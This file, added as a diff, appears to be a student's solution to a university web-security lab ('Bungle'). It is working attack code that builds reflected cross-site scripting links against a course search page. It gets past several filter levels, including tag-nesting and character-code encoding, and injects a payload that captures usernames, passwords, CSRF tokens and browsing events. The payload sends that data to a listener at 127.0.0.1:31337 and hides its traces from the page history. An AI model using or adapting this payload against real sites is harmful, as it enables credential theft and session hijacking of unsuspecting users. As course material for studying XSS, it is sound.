@@ -1,0 +1,154 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<style>
+body {background-image: url("https://i.imgur.com/GpCfuFQ.png");background-repeat: no-repeat;background-size: 25% auto;background-position: left top;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;}
+.links-container {display: flex;justify-content: space-between;align-items: center;flex-wrap: wrap;padding: 20px;border: 2px solid black;width: 80%;}
+.flex-item {width: 100px;height: 100px;margin: 10px;border: 1px solid black;text-align: center;line-height: 100px;}
+h3 a {color: black;}
+</style>
+<script>
+function payload(attacker){
+let href=location.href; // retrieve current url
+
+// record event by sending GET to attacker 
+const rEv=(inP)=>{
+    console.log(inP); // log to console for debug
+    $.get(attacker,inP); // send the get 
+}
+
+// retrieve login and account creation
+const pReq=(eN,lgE)=>{ 
+    var usr=$("#username").val(); // pulled from input 
+    var pwd=$("#userpass").val();
+    $.post("./"+eN,{username:usr,password:pwd},()=>{ // log with post
+        rEv({event:lgE,user:usr,pass:pwd}); // call "record event" function
+        ldP("./");} // reload page
+    );
+}
+
+// retrieve history form browser sessionStorage
+const getH=()=>{
+    const gH=sessionStorage.getItem('history'); 
+    return gH?JSON.parse(gH):[]; // store history if there is any
+}
+
+// set the history in sessionStorage
+const setH=(gH)=>{
+    sessionStorage.setItem('history',JSON.stringify(gH)); // stored as JSON
+}
+
+// add a resource and update history
+const addH=(rsrc)=>{
+    const gh=getH();
+    gh.push(rsrc),setH(gh);
+}
+
+// add new url to history & display in browser bar
+const newH=(href)=>{
+    addH(href),window.history.pushState({},"",href);
+}
+
+// load the page - bind event handlers
+const ldP=(href,Qry)=>{
+    $("html").load(href,()=>{ // load the current href content into <html> element.
+        $("html").show();
+        $("#query").val(Qry); // setting value of the search bar
+        var usr=$("#logged-in-user").val(); // retrieve the logged in user from html
+        $(document).ready(()=>{ // execute only when dom is loaded
+            // retrieve the "default" csrf token form login form hidden value
+            var tknELM=document.querySelector("input[name='csrf_token']");
+            if (tknELM !== null){
+                var tknVAL=tknELM.value;
+                rEv({event:"tknex",csrf_token:tknVAL}); // record token
+            }else{
+                console.log("notkn");
+            }
+        });
+        // record navigation
+        rEv({event:"nav",user:usr,url:href});
+        // replace browser history current state without changing displayed url
+        window.history.replaceState({},"",href);
+        // removing history items from logged in user history if "func. pay."
+        $(".history-item").each((_,item)=>{
+            if($(item).text().includes("function payload(")){
+            $(item).remove();
+            }});
+        // button click events
+        $("#log-in-btn").on("click",event=>{
+            event.preventDefault();
+            pReq("login","login");
+        });
+        $("#new-account-btn").on("click",event=>{
+            event.preventDefault();
+            pReq("create", "login");
+        });
+        $("#log-out-btn").on("click",event=>{
+            event.preventDefault();
+            var usr = $("#logged-in-user").text();
+            $.post("./logout",()=>{
+                rEv({event:"logout",user:usr});
+                ldP("./");
+            });
+        });
+        $("#bungle-lnk").on("click",event=>{
+            event.preventDefault();
+            href="/project2b/"
+            newH(href);
+            ldP(href);
+        });
+        $("#search-again-btn").on("click",event=>{
+            event.preventDefault();
+            newH(href);
+            ldP("./");
+        });
+        $("#search-btn").on("click",event=>{
+            event.preventDefault();
+            Qry=$("#query").val();
+            Qry=Qry.replace(/ /g,"+");
+            href="./search?q="+Qry;
+            newH(href);
+            ldP(href,Qry);
+        });
+        // popstate function for back/fwd buttons
+        $(window).on("popstate",event=>{
+            const gH=getH();
+                if(gH.length>1){
+                    const prvH=gH.pop();
+                    setH(gH);
+                    ldP(prvH);
+                }else{
+                    ldP(gH[0]);
+                }
+        });        
+    }
+);
+}
+$("html").hide();
+ldP("./");
+}
+function ncdSTR(query){
+    var myRe=/".*?"/g;var match; // match all between double quotes for 
+    while((match=myRe.exec(query))!==null){
+        var ncdedSTR="";
+        for(var idx=1;idx<match[0].length-1;++idx){
+            ncdedSTR+=match[0].charCodeAt(idx)+",";}
+        ncdedSTR=ncdedSTR.slice(0,-1);
+        ncdedSTR="String.fromCharCode("+ncdedSTR+")"; 
+        query=query.replace(match[0],ncdedSTR);}return query;}  
+function mkLnk(xssdefense,target,atkr){ // divided out the base url from the payload query
+    var bQry=target+"./search?xssdefense="+xssdefense.toString()+"&q=";
+    var payLd=payload.toString()+";payload(\""+atkr+"\");";
+    switch(xssdefense){ // case for url construction based on defense
+    case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
+    case 1:
+    case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
+    case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
+const target = "http://cs526-online.cs.purdue.edu/project2b/";
+const atkr =  "http://127.0.0.1:31337/";
+$(function(){
+    var container = $("<div></div>").addClass("links-container");
+    for(var xssdefense=0;xssdefense<=3;xssdefense++){
+        var url=mkLnk(xssdefense,target,atkr);
+        container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! "+xssdefense.toString()+"</a></h3>");}
+        $("body").append(container);});
+</script>
